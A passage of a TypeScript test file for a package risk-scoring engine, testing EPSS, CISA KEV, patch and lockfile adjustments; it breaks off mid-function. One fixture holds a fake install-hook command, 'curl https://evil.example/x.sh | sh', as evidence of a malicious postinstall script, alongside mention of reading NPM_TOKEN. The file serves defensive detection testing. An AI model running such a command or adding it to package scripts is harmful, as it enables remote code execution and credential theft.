import { describe, expect, it } from "vitest";

import { emptyBehaviorSummary, emptyScriptThreatSummary, sampleAnalyses } from "@binshield/analysis-types";
import type { ManifestAnalysis } from "@binshield/analysis-types";
import {
  aggregatePackageRisk,
  aggregatePackageRiskWithManifest,
  buildActiveThreatContext,
  buildCisaKevFindings,
  buildLockfilePatchableFindings,
  cisaKevBoost,
  epssBoost,
  epssPercentileBoost,
  fixAvailabilityBoost,
  isFeedFresh,
  kevBoostForVuln,
  patchDeploymentModifier,
  riskLevelFromScore,
  scoreBinary,
  scoreManifest,
  scoreWithActiveVulnerabilities,
  shouldForceCritical,
  transitiveVulnScan,
  vendorPatchPenalty
} from "./index";
import type {
  ActiveVulnerability,
  CisaKevContext,
  DepNode,
  EpssContext,
  LockfileResolutionContext,
  PatchDeploymentContext,
  VendorPatchContext
} from "./index";

function makeManifest(overrides: Partial<ManifestAnalysis> = {}): ManifestAnalysis {
  return {
    id: "manifest_test",
    ecosystem: "npm",
    lifecycleHooks: {},
    hasInstallScripts: false,
    analyzedFiles: [],
    riskScore: 0,
    riskLevel: "none",
    threats: emptyScriptThreatSummary(),
    findings: [],
    knownMalwareAdvisoryIds: [],
    sourceMatchConfidence: "medium",
    analyzedAt: "2026-05-21T00:00:00.000Z",
    ...overrides
  };
}

describe("risk engine", () => {
  it("maps scores to levels", () => {
    expect(riskLevelFromScore(0)).toBe("none");
    expect(riskLevelFromScore(12)).toBe("low");
    expect(riskLevelFromScore(34)).toBe("medium");
    expect(riskLevelFromScore(65)).toBe("high");
    expect(riskLevelFromScore(91)).toBe("critical");
  });

  it("scores suspicious behaviors above benign ones", () => {
    const low = scoreBinary({
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 4,
      functionCount: 20
    });
    const high = scoreBinary({
      behaviors: {
        ...emptyBehaviorSummary(),
        network: { detected: true, details: ["Connects to remote host"] },
        dataExfiltration: { detected: true, details: ["Uploads environment variables"] },
        obfuscation: { detected: true, details: ["Encrypted strings"] }
      },
      findings: [
        {
          severity: "critical",
          title: "Outbound exfiltration",
          description: "Sends data to an unknown domain",
          recommendation: "Block package"
        }
      ],
      importCount: 18,
      functionCount: 52
    });

    expect(high.riskScore).toBeGreaterThan(low.riskScore);
    expect(high.riskLevel).toBe("critical");
  });

  it("aggregates package risk from binaries", () => {
    const aggregate = aggregatePackageRisk(sampleAnalyses[0].binaries);
    expect(aggregate.riskScore).toBeGreaterThan(0);
    expect(aggregate.riskLevel).toBe("low");
  });

  it("scores a malicious install script even when the package has no binaries", () => {
    const manifest = makeManifest({
      hasInstallScripts: true,
      threats: {
        ...emptyScriptThreatSummary(),
        remoteCodeExecution: { detected: true, details: ["postinstall pipes curl into a shell"] },
        environmentTheft: { detected: true, details: ["reads process.env.NPM_TOKEN"] }
      },
      findings: [
        {
          category: "remoteCodeExecution",
          severity: "critical",
          title: "Remote code execution in postinstall hook",
          description: "postinstall hook downloads and executes remote code at install time",
          filePath: "package.json#scripts.postinstall",
          evidence: "curl https://evil.example/x.sh | sh",
          lifecycleHook: "postinstall",
          recommendation: "Do not install this package."
        }
      ]
    });

    const score = scoreManifest(manifest);
    expect(score.riskScore).toBeGreaterThan(0);
    expect(score.riskLevel).toBe("critical");

    // The old binary-only path returns "none" for a package with no binaries —
    // this is the gap the manifest path closes.
    expect(aggregatePackageRisk([]).riskLevel).toBe("none");
    expect(aggregatePackageRiskWithManifest([], manifest).riskLevel).toBe("critical");
  });

  it("forces a critical verdict for known-malware matches", () => {
    const manifest = makeManifest({ knownMalwareAdvisoryIds: ["MAL-2026-0001"] });
    expect(scoreManifest(manifest)).toEqual({ riskScore: 100, riskLevel: "critical" });
    expect(aggregatePackageRiskWithManifest([], manifest).riskLevel).toBe("critical");
  });

  it("takes the max of binary and manifest risk, never diluting either", () => {
    const cleanManifest = makeManifest();
    const binaryOnly = aggregatePackageRisk(sampleAnalyses[0].binaries);
    const merged = aggregatePackageRiskWithManifest(sampleAnalyses[0].binaries, cleanManifest);
    expect(merged.riskScore).toBe(binaryOnly.riskScore);
  });
});

describe("EPSS boost", () => {
  it("returns 0 when no EPSS context is provided", () => {
    expect(epssBoost(undefined)).toBe(0);
  });

  it("returns 0 when percentile is below 0.75", () => {
    expect(epssBoost({ maxEpssPercentile: 0.50 })).toBe(0);
    expect(epssBoost({ maxEpssPercentile: 0.74 })).toBe(0);
  });

  it("returns 15 when percentile is between 0.75 and 0.90", () => {
    expect(epssBoost({ maxEpssPercentile: 0.75 + 0.001 })).toBe(15);
    expect(epssBoost({ maxEpssPercentile: 0.80 })).toBe(15);
    expect(epssBoost({ maxEpssPercentile: 0.90 })).toBe(15);
  });

  it("returns 25 when percentile exceeds 0.90 (exploited in the wild)", () => {
    expect(epssBoost({ maxEpssPercentile: 0.901 })).toBe(25);
    expect(epssBoost({ maxEpssPercentile: 0.99 })).toBe(25);
    expect(epssBoost({ maxEpssPercentile: 1.0 })).toBe(25);
  });

  it("scoreBinary applies EPSS boost on top of base score", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 0,
      functionCount: 0
    };

    const withoutEpss = scoreBinary(binary);
    const withLowEpss = scoreBinary(binary, { maxEpssPercentile: 0.50 });
    const withHighEpss = scoreBinary(binary, { maxEpssPercentile: 0.80 });
    const withCriticalEpss = scoreBinary(binary, { maxEpssPercentile: 0.95 });

    // No boost below threshold
    expect(withLowEpss.riskScore).toBe(withoutEpss.riskScore);
    // 15-pt boost above 0.75
    expect(withHighEpss.riskScore).toBe(withoutEpss.riskScore + 15);
    // 25-pt boost above 0.90
    expect(withCriticalEpss.riskScore).toBe(Math.min(100, withoutEpss.riskScore + 25));
  });

  it("scoreBinary with EPSS boost escalates risk level for borderline packages", () => {
    // A low-risk binary (score ~8) should escalate to medium when an EPSS
    // percentile > 0.75 is present (+15 → 23 = medium)
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [{ severity: "low" as const, title: "Minor issue", description: "Minor", recommendation: "Review" }],
      importCount: 0,
      functionCount: 0
    };

    const withoutEpss = scoreBinary(binary);
    expect(withoutEpss.riskLevel).toBe("low");

    const withEpss = scoreBinary(binary, { maxEpssPercentile: 0.85 });
    // 8 + 15 = 23 → still low boundary, depending on base; assert it is higher
    expect(withEpss.riskScore).toBeGreaterThan(withoutEpss.riskScore);
  });

  it("scoreManifest applies EPSS boost while preserving malware-override", () => {
    const cleanManifest = makeManifest();

    const withoutEpss = scoreManifest(cleanManifest);
    const withHighEpss = scoreManifest(cleanManifest, { maxEpssPercentile: 0.80 });
    const withCriticalEpss = scoreManifest(cleanManifest, { maxEpssPercentile: 0.95 });

    expect(withHighEpss.riskScore).toBe(withoutEpss.riskScore + 15);
    expect(withCriticalEpss.riskScore).toBe(Math.min(100, withoutEpss.riskScore + 25));

    // Known-malware still forces 100 even with EPSS context
    const malwareManifest = makeManifest({ knownMalwareAdvisoryIds: ["MAL-2026-0001"] });
    expect(scoreManifest(malwareManifest, { maxEpssPercentile: 0.95 })).toEqual({
      riskScore: 100,
      riskLevel: "critical"
    });
  });
});

// ---------------------------------------------------------------------------
// CISA KEV boost
// ---------------------------------------------------------------------------

function makeKev(overrides: Partial<CisaKevContext> = {}): CisaKevContext {
  return {
    kevMatches: [],
    ...overrides
  };
}

describe("CISA KEV boost", () => {
  it("returns 0 when no KEV context provided", () => {
    expect(cisaKevBoost(undefined)).toBe(0);
  });

  it("returns 0 for empty matches array", () => {
    expect(cisaKevBoost(makeKev())).toBe(0);
  });

  it("returns 0 for proof-of-concept only (no confirmed exploitation)", () => {
    expect(
      cisaKevBoost(
        makeKev({
          kevMatches: [{ cveId: "CVE-2024-0001", firstSeenDate: "2024-01-15", exploitMaturity: "proof-of-concept" }]
        })
      )
    ).toBe(0);
  });

  it("returns +20 for active-exploitation match", () => {
    expect(
      cisaKevBoost(
        makeKev({
          kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-10", exploitMaturity: "active-exploitation" }]
        })
      )
    ).toBe(20);
  });

  it("returns +20 for widespread match (ransomware-level)", () => {
    expect(
      cisaKevBoost(
        makeKev({
          kevMatches: [{ cveId: "CVE-2024-0003", firstSeenDate: "2024-06-01", exploitMaturity: "widespread" }]
        })
      )
    ).toBe(20);
  });

  it("returns +20 when mix of proof-of-concept and active-exploitation", () => {
    expect(
      cisaKevBoost(
        makeKev({
          kevMatches: [
            { cveId: "CVE-2024-0001", firstSeenDate: "2024-01-01", exploitMaturity: "proof-of-concept" },
            { cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }
          ]
        })
      )
    ).toBe(20);
  });

  it("scoreBinary applies CISA KEV boost on top of base score", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 0,
      functionCount: 0
    };

    const noKev = scoreBinary(binary);
    const withPoC = scoreBinary(binary, undefined, makeKev({
      kevMatches: [{ cveId: "CVE-2024-0001", firstSeenDate: "2024-01-01", exploitMaturity: "proof-of-concept" }]
    }));
    const withActive = scoreBinary(binary, undefined, makeKev({
      kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }]
    }));

    // PoC does not boost
    expect(withPoC.riskScore).toBe(noKev.riskScore);
    // Active exploitation adds +20
    expect(withActive.riskScore).toBe(noKev.riskScore + 20);
  });

  it("scoreBinary stacks EPSS and CISA KEV boosts independently", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 0,
      functionCount: 0
    };

    const noBoosts = scoreBinary(binary);
    const epssOnly = scoreBinary(binary, { maxEpssPercentile: 0.80 });
    const kevOnly = scoreBinary(binary, undefined, makeKev({
      kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }]
    }));
    const both = scoreBinary(binary, { maxEpssPercentile: 0.80 }, makeKev({
      kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }]
    }));

    expect(epssOnly.riskScore).toBe(noBoosts.riskScore + 15);
    expect(kevOnly.riskScore).toBe(noBoosts.riskScore + 20);
    expect(both.riskScore).toBe(Math.min(100, noBoosts.riskScore + 15 + 20));
  });

  it("scoreManifest applies CISA KEV boost while preserving malware-override", () => {
    const cleanManifest = makeManifest();
    const kev = makeKev({
      kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }]
    });

    const withoutKev = scoreManifest(cleanManifest);
    const withKev = scoreManifest(cleanManifest, undefined, kev);

    expect(withKev.riskScore).toBe(withoutKev.riskScore + 20);

    // Known-malware still forces 100 regardless of KEV
    const malwareManifest = makeManifest({ knownMalwareAdvisoryIds: ["MAL-2026-0001"] });
    expect(scoreManifest(malwareManifest, undefined, kev)).toEqual({
      riskScore: 100,
      riskLevel: "critical"
    });
  });
});

// ---------------------------------------------------------------------------
// buildCisaKevFindings
// ---------------------------------------------------------------------------

describe("buildCisaKevFindings", () => {
  it("returns empty array when no KEV context", () => {
    expect(buildCisaKevFindings(undefined)).toEqual([]);
  });

  it("returns empty array when no matches", () => {
    expect(buildCisaKevFindings(makeKev())).toEqual([]);
  });

  it("does not emit findings for proof-of-concept only", () => {
    const findings = buildCisaKevFindings(
      makeKev({
        kevMatches: [{ cveId: "CVE-2024-0001", firstSeenDate: "2024-01-01", exploitMaturity: "proof-of-concept" }]
      })
    );
    expect(findings).toHaveLength(0);
  });

  it("emits CRITICAL finding for active-exploitation", () => {
    const findings = buildCisaKevFindings(
      makeKev({
        kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-10", exploitMaturity: "active-exploitation" }]
      })
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("critical");
    expect(findings[0]!.title).toContain("CVE-Actively-Exploited-In-Wild");
    expect(findings[0]!.title).toContain("CVE-2024-0002");
    expect(findings[0]!.description).toContain("active-exploitation");
    expect(findings[0]!.description).toContain("2024-03-10");
  });

  it("emits CRITICAL finding for widespread (ransomware)", () => {
    const findings = buildCisaKevFindings(
      makeKev({
        kevMatches: [{ cveId: "CVE-2024-0003", firstSeenDate: "2024-06-01", exploitMaturity: "widespread" }]
      })
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("critical");
    expect(findings[0]!.title).toContain("CVE-2024-0003");
  });

  it("emits one finding per active CVE (multiple matches)", () => {
    const findings = buildCisaKevFindings(
      makeKev({
        kevMatches: [
          { cveId: "CVE-2024-0001", firstSeenDate: "2024-01-01", exploitMaturity: "proof-of-concept" },
          { cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" },
          { cveId: "CVE-2024-0003", firstSeenDate: "2024-06-01", exploitMaturity: "widespread" }
        ]
      })
    );
    // PoC is excluded; active + widespread = 2 findings
    expect(findings).toHaveLength(2);
    expect(findings.every((f) => f.severity === "critical")).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Vendor patch penalty
// ---------------------------------------------------------------------------

function makePatch(overrides: Partial<VendorPatchContext> = {}): VendorPatchContext {
  return {
    cveId: "CVE-2024-9999",
    patchedVersion: "2.0.0",
    daysToFix: 30,
    vendorConfidence: "high",
    ...overrides
  };
}

describe("vendorPatchPenalty", () => {
  it("returns 0 when no patches are provided", () => {
    expect(vendorPatchPenalty(undefined)).toBe(0);
    expect(vendorPatchPenalty([])).toBe(0);
  });

  it("returns -15 for high-confidence patch", () => {
    expect(vendorPatchPenalty([makePatch({ vendorConfidence: "high" })])).toBe(-15);
  });

  it("returns -10 for medium-confidence patch", () => {
    expect(vendorPatchPenalty([makePatch({ vendorConfidence: "medium" })])).toBe(-10);
  });

  it("returns -5 for low-confidence patch", () => {
    expect(vendorPatchPenalty([makePatch({ vendorConfidence: "low" })])).toBe(-5);
  });

  it("uses best-confidence patch when multiple patches are provided", () => {
    const patches = [
      makePatch({ vendorConfidence: "low" }),
      makePatch({ vendorConfidence: "high" }),
      makePatch({ vendorConfidence: "medium" })
    ];
    expect(vendorPatchPenalty(patches)).toBe(-15);
  });

  it("scoreBinary applies vendor patch penalty on top of base score", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [{ severity: "high" as const, title: "Vuln", description: "desc", recommendation: "fix" }],
      importCount: 0,
      functionCount: 0
    };

    const withoutPatch = scoreBinary(binary);
    const withHighPatch = scoreBinary(binary, undefined, undefined, undefined, [makePatch({ vendorConfidence: "high" })]);
    const withMedPatch = scoreBinary(binary, undefined, undefined, undefined, [makePatch({ vendorConfidence: "medium" })]);

    // Patch reduces score by 15 / 10 / 5 respectively
    expect(withHighPatch.riskScore).toBe(Math.max(0, withoutPatch.riskScore - 15));
    expect(withMedPatch.riskScore).toBe(Math.max(0, withoutPatch.riskScore - 10));
  });

  it("scoreManifest applies vendor patch penalty while preserving malware-override", () => {
    const manifest = makeManifest({
      threats: {
        ...emptyScriptThreatSummary(),
        scriptInjection: { detected: true, details: ["eval usage"] }
      },
      findings: [
        {
          category: "scriptInjection",
          severity: "high",
          title: "Script injection",
          description: "eval usage",
          filePath: "index.js",
          evidence: "eval(x)",
          recommendation: "Remove eval"
        }
      ]
    });

    const withoutPatch = scoreManifest(manifest);
    const withPatch = scoreManifest(manifest, undefined, undefined, [makePatch({ vendorConfidence: "high" })]);

    expect(withPatch.riskScore).toBe(Math.max(0, withoutPatch.riskScore - 15));

    // Known-malware still forces 100 even with a patch context
    const malwareManifest = makeManifest({ knownMalwareAdvisoryIds: ["MAL-2026-0001"] });
    expect(scoreManifest(malwareManifest, undefined, undefined, [makePatch({ vendorConfidence: "high" })])).toEqual({
      riskScore: 100,
      riskLevel: "critical"
    });
  });

  it("vendor patch penalty stacks with EPSS boost but cannot push score below 0", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 0,
      functionCount: 0
    };

    // Base score = 0; EPSS adds 15; patch subtracts 15 → still 0
    const result = scoreBinary(binary, { maxEpssPercentile: 0.80 }, undefined, undefined, [makePatch({ vendorConfidence: "high" })]);
    expect(result.riskScore).toBe(0);
  });

  it("real-world scenario: CRITICAL CVE becomes MEDIUM after vendor patch (high confidence)", () => {
    // A binary with a critical finding scores ~45; -15 patch penalty → 30 (medium boundary)
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [{ severity: "critical" as const, title: "RCE", description: "Remote code execution", recommendation: "Upgrade" }],
      importCount: 0,
      functionCount: 0
    };

    const withoutPatch = scoreBinary(binary);
    expect(withoutPatch.riskLevel).toBe("medium"); // 45 → medium

    // After high-confidence patch: 45 - 15 = 30 → still medium boundary
    const withPatch = scoreBinary(binary, undefined, undefined, undefined, [makePatch({ vendorConfidence: "high" })]);
    expect(withPatch.riskScore).toBe(withoutPatch.riskScore - 15);
  });
});

// ---------------------------------------------------------------------------
// Patch deployment modifier
// ---------------------------------------------------------------------------

function makeDeployment(overrides: Partial<PatchDeploymentContext> = {}): PatchDeploymentContext {
  return {
    cveId: "CVE-2024-9999",
    patchPublishedAt: "2024-01-01T00:00:00.000Z",
    daysSincePatch: 30,
    ecosystemAdoptionRate: 0.3,
    ...overrides
  };
}

describe("patchDeploymentModifier", () => {
  it("returns 0 when no deployment context provided", () => {
    expect(patchDeploymentModifier(undefined)).toBe(0);
  });

  it("returns 0 when patch is too new (< 7 days)", () => {
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 3 }))).toBe(0);
  });

  it("returns 0 when adoption rate is below 5%", () => {
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 30, ecosystemAdoptionRate: 0.04 }))).toBe(0);
  });

  it("returns 0 when adoption rate is unknown", () => {
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 30, ecosystemAdoptionRate: undefined }))).toBe(0);
  });

  it("returns -5 when >= 30 days old and >= 25% adoption", () => {
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 30, ecosystemAdoptionRate: 0.25 }))).toBe(-5);
  });

  it("returns -10 when >= 90 days old and >= 50% adoption", () => {
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 90, ecosystemAdoptionRate: 0.50 }))).toBe(-10);
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 120, ecosystemAdoptionRate: 0.75 }))).toBe(-10);
  });

  it("returns -5 (not -10) when 90+ days but adoption < 50%", () => {
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 90, ecosystemAdoptionRate: 0.35 }))).toBe(-5);
  });

  it("stacks with vendorPatchPenalty for maximum downgrade", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [{ severity: "high" as const, title: "Vuln", description: "desc", recommendation: "fix" }],
      importCount: 0,
      functionCount: 0
    };

    const base = scoreBinary(binary);
    // High-confidence patch (-15) + mature deployment (-10) = -25
    const withBoth = scoreBinary(
      binary,
      undefined,
      undefined,
      undefined,
      [makePatch({ vendorConfidence: "high" })],
      makeDeployment({ daysSincePatch: 90, ecosystemAdoptionRate: 0.55 })
    );
    expect(withBoth.riskScore).toBe(Math.max(0, base.riskScore - 25));
  });
});

// ---------------------------------------------------------------------------
// buildLockfilePatchableFindings
// ---------------------------------------------------------------------------

function makeLockfileResolution(overrides: Partial<LockfileResolutionContext> = {}): LockfileResolutionContext {
  return {
    cveId: "CVE-2024-9999",
    resolvedVersion: "1.0.0",
    patchedVersion: "2.0.0",
    isUnpatched: true,
    ...overrides
  };
}

describe("buildLockfilePatchableFindings", () => {
  it("returns empty array when no resolutions provided", () => {
    expect(buildLockfilePatchableFindings(undefined)).toEqual([]);
    expect(buildLockfilePatchableFindings([])).toEqual([]);
  });

  it("returns empty array when all resolutions are patched", () => {
    const resolutions = [makeLockfileResolution({ isUnpatched: false })];
    expect(buildLockfilePatchableFindings(resolutions)).toHaveLength(0);
  });

  it("emits MEDIUM finding for unpatched lockfile entry", () => {
    const resolutions = [makeLockfileResolution({ isUnpatched: true })];
    const findings = buildLockfilePatchableFindings(resolutions);
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("medium");
    expect(findings[0]!.title).toContain("CVE-2024-9999");
    expect(findings[0]!.title).toContain("Patchable vulnerability");
    expect(findings[0]!.description).toContain("1.0.0");
    expect(findings[0]!.description).toContain("2.0.0");
  });

  it("emits one finding per unpatched CVE, skips patched ones", () => {
    const resolutions = [
      makeLockfileResolution({ cveId: "CVE-2024-0001", isUnpatched: true }),
      makeLockfileResolution({ cveId: "CVE-2024-0002", isUnpatched: false }),
      makeLockfileResolution({ cveId: "CVE-2024-0003", isUnpatched: true })
    ];
    const findings = buildLockfilePatchableFindings(resolutions);
    expect(findings).toHaveLength(2);
    expect(findings.every((f) => f.severity === "medium")).toBe(true);
    expect(findings.map((f) => f.title)).toContain("Patchable vulnerability: CVE-2024-0001");
    expect(findings.map((f) => f.title)).toContain("Patchable vulnerability: CVE-2024-0003");
  });

  it("finding description mentions both resolved and patched versions", () => {
    const findings = buildLockfilePatchableFindings([
      makeLockfileResolution({ resolvedVersion: "3.1.4", patchedVersion: "3.2.0", isUnpatched: true })
    ]);
    expect(findings[0]!.description).toContain("3.1.4");
    expect(findings[0]!.description).toContain("3.2.0");
    expect(findings[0]!.recommendation).toBeTruthy();
  });
});

// ---------------------------------------------------------------------------
// ActiveVulnerability helpers — feed freshness, per-vuln boosts
// ---------------------------------------------------------------------------

/** Build a fresh ActiveVulnerability with sensible defaults. */
function makeVuln(overrides: Partial<ActiveVulnerability> = {}): ActiveVulnerability {
  return {
    cveId: "CVE-2025-0001",
    epssPercentile: 0,
    isKev: false,
    feedUpdatedAt: new Date().toISOString(), // fresh by default
    ...overrides
  };
}

const STALE_DATE = new Date(Date.now() - 31 * 24 * 60 * 60 * 1000).toISOString();
const FRESH_DATE = new Date().toISOString();

describe("isFeedFresh", () => {
  it("returns true for a just-updated entry", () => {
    expect(isFeedFresh(makeVuln({ feedUpdatedAt: FRESH_DATE }))).toBe(true);
  });

  it("returns false for an entry older than 30 days", () => {
    expect(isFeedFresh(makeVuln({ feedUpdatedAt: STALE_DATE }))).toBe(false);
  });

  it("returns false for an invalid date string", () => {
    expect(isFeedFresh(makeVuln({ feedUpdatedAt: "not-a-date" }))).toBe(false);
  });
});

describe("epssPercentileBoost", () => {
  it("returns 0 below 40th percentile", () => {
    expect(epssPercentileBoost(0)).toBe(0);
    expect(epssPercentileBoost(0.39)).toBe(0);
  });

  it("returns +5 for 40th–75th percentile range", () => {
    expect(epssPercentileBoost(0.40)).toBe(5);
    expect(epssPercentileBoost(0.60)).toBe(5);
    expect(epssPercentileBoost(0.75)).toBe(5);
  });

  it("returns +15 for 75th–90th percentile range", () => {
    expect(epssPercentileBoost(0.751)).toBe(15);
    expect(epssPercentileBoost(0.85)).toBe(15);
    expect(epssPercentileBoost(0.90)).toBe(15);
  });

  it("returns +25 above 90th percentile", () => {
    expect(epssPercentileBoost(0.901)).toBe(25);
    expect(epssPercentileBoost(1.0)).toBe(25);
  });
});

describe("kevBoostForVuln", () => {
  it("returns 0 when isKev is false", () => {
    expect(kevBoostForVuln(makeVuln({ isKev: false }))).toBe(0);
  });

  it("returns 0 for KEV proof-of-concept", () => {
    expect(
      kevBoostForVuln(makeVuln({ isKev: true, exploitMaturity: "proof-of-concept" }))
    ).toBe(0);
  });

  it("returns +20 for KEV active-exploitation", () => {
    expect(
      kevBoostForVuln(makeVuln({ isKev: true, exploitMaturity: "active-exploitation" }))
    ).toBe(20);
  });

  it("returns +20 for KEV widespread", () => {
    expect(
      kevBoostForVuln(makeVuln({ isKev: true, exploitMaturity: "widespread" }))
    ).toBe(20);
  });
});

describe("fixAvailabilityBoost", () => {
  it("returns +10 when no patchedVersion (no fix exists)", () => {
    expect(fixAvailabilityBoost(makeVuln({ patchedVersion: undefined }))).toBe(10);
  });

  it("returns +5 when patch exists but unmerged", () => {
    expect(
      fixAvailabilityBoost(
        makeVuln({ patchedVersion: "2.0.0", patchAvailableButUnmerged: true })
      )
    ).toBe(5);
  });

  it("returns 0 when patch is applied", () => {
    expect(
      fixAvailabilityBoost(
        makeVuln({ patchedVersion: "2.0.0", patchAvailableButUnmerged: false })
      )
    ).toBe(0);
  });
});

describe("shouldForceCritical", () => {
  it("returns false when not in KEV", () => {
    expect(shouldForceCritical(makeVuln({ isKev: false }))).toBe(false);
  });

  it("returns false for KEV proof-of-concept", () => {
    expect(
      shouldForceCritical(makeVuln({ isKev: true, exploitMaturity: "proof-of-concept" }))
    ).toBe(false);
  });

  it("returns true for KEV active-exploitation", () => {
    expect(
      shouldForceCritical(makeVuln({ isKev: true, exploitMaturity: "active-exploitation" }))
    ).toBe(true);
  });

  it("returns true for KEV widespread", () => {
    expect(
      shouldForceCritical(makeVuln({ isKev: true, exploitMaturity: "widespread" }))
    ).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Multi-CVE stacking
// ---------------------------------------------------------------------------

describe("activeVulnAdjustment / multi-CVE stacking", () => {
  it("stacks boosts from multiple CVEs", () => {
    const vulns: ActiveVulnerability[] = [
      makeVuln({ cveId: "CVE-2025-0001", epssPercentile: 0.50 }),  // +5
      makeVuln({ cveId: "CVE-2025-0002", epssPercentile: 0.80 }),  // +15
      makeVuln({ cveId: "CVE-2025-0003", isKev: true, exploitMaturity: "active-exploitation", epssPercentile: 0 }) // +20
    ];
    // Each has no patch (patchedVersion undefined) → +10 each = +30 extra
    // EPSS: 5+15+0 = 20, KEV: 0+0+20 = 20, no-fix: 10+10+10 = 30 → total 70
    const total = vulns.reduce((acc, v) => {
      const { epssPercentileBoost: eb, kevBoostForVuln: kb, fixAvailabilityBoost: fb } =
        // inline the math to avoid circular import confusion in the test
        { epssPercentileBoost: epssPercentileBoost(v.epssPercentile), kevBoostForVuln: kevBoostForVuln(v), fixAvailabilityBoost: fixAvailabilityBoost(v) };
      return acc + eb + kb + fb;
    }, 0);
    expect(total).toBe(70);
  });

  it("stale CVEs are not included in stacking", () => {
    const vulns: ActiveVulnerability[] = [
      makeVuln({ cveId: "CVE-2025-0001", epssPercentile: 0.95, feedUpdatedAt: STALE_DATE }),
      makeVuln({ cveId: "CVE-2025-0002", epssPercentile: 0.95, feedUpdatedAt: FRESH_DATE })
    ];
    // Only the fresh one should count
    const freshVulns = vulns.filter((v) => isFeedFresh(v));
    expect(freshVulns).toHaveLength(1);
    expect(freshVulns[0]!.cveId).toBe("CVE-2025-0002");
  });
});

// ---------------------------------------------------------------------------
// CISA KEV critical override
// ---------------------------------------------------------------------------

describe("scoreWithActiveVulnerabilities — CISA KEV override", () => {
  it("forces critical risk level even when numeric score is below 80", () => {
    const binaries = sampleAnalyses[0]!.binaries;
    const kev = makeVuln({
      cveId: "CVE-2025-KEV-001",
      isKev: true,
      exploitMaturity: "active-exploitation",
      epssPercentile: 0,
      patchedVersion: "1.0.0",
      patchAvailableButUnmerged: false
    });

    const result = scoreWithActiveVulnerabilities(binaries as import("@binshield/analysis-types").BinaryAnalysis[], undefined, [kev]);
    expect(result.riskLevel).toBe("critical");
  });

  it("does NOT force critical for KEV proof-of-concept", () => {
    const vulns = [
      makeVuln({
        cveId: "CVE-2025-POC-001",
        isKev: true,
        exploitMaturity: "proof-of-concept",
        epssPercentile: 0,
        patchedVersion: "1.0.0",
        patchAvailableButUnmerged: false
      })
    ];
    const result = scoreWithActiveVulnerabilities([], undefined, vulns);
    // No KEV active-exploitation — riskLevel determined by score alone
    expect(result.riskLevel).not.toBe("critical");
  });
});

// ---------------------------------------------------------------------------
// EPSS percentile tiers
// ---------------------------------------------------------------------------

describe("scoreWithActiveVulnerabilities — EPSS percentile tiers", () => {
  const emptyBinary = {
    behaviors: emptyBehaviorSummary(),
    findings: [] as import("@binshield/analysis-types").Finding[],
    importCount: 0,
    functionCount: 0
  };

  it("40th–75th percentile adds +5 pts per CVE", () => {
    const noVulns = scoreWithActiveVulnerabilities([], undefined, []);
    const withVuln = scoreWithActiveVulnerabilities([], undefined, [
      makeVuln({ epssPercentile: 0.60, patchedVersion: "1.0.0", patchAvailableButUnmerged: false })
    ]);
    // +5 EPSS, no fix penalty → +5 total
    expect(withVuln.riskScore).toBe(noVulns.riskScore + 5);
  });

  it("75th–90th percentile adds +15 pts per CVE", () => {
    const noVulns = scoreWithActiveVulnerabilities([], undefined, []);
    const withVuln = scoreWithActiveVulnerabilities([], undefined, [
      makeVuln({ epssPercentile: 0.80, patchedVersion: "1.0.0", patchAvailableButUnmerged: false })
    ]);
    expect(withVuln.riskScore).toBe(noVulns.riskScore + 15);
  });

  it(">90th percentile adds +25 pts per CVE", () => {
    const noVulns = scoreWithActiveVulnerabilities([], undefined, []);
    const withVuln = scoreWithActiveVulnerabilities([], undefined, [
      makeVuln({ epssPercentile: 0.95, patchedVersion: "1.0.0", patchAvailableButUnmerged: false })
    ]);
    expect(withVuln.riskScore).toBe(noVulns.riskScore + 25);
  });

  it("below 40th percentile adds 0 pts", () => {
    const noVulns = scoreWithActiveVulnerabilities([], undefined, []);
    const withVuln = scoreWithActiveVulnerabilities([], undefined, [
      makeVuln({ epssPercentile: 0.39, patchedVersion: "1.0.0", patchAvailableButUnmerged: false })
    ]);
    expect(withVuln.riskScore).toBe(noVulns.riskScore);
  });
});

// ---------------------------------------------------------------------------
// Transitive vulnerability inheritance
// ---------------------------------------------------------------------------

describe("transitiveVulnScan — DFS transitive inheritance", () => {
  function makeGraph(): Map<string, DepNode> {
    const vuln1 = makeVuln({ cveId: "CVE-ROOT-001", epssPercentile: 0.80 });
    const vuln2 = makeVuln({ cveId: "CVE-CHILD-001", epssPercentile: 0.50 });
    const vuln3 = makeVuln({ cveId: "CVE-GRANDCHILD-001", isKev: true, exploitMaturity: "active-exploitation" });

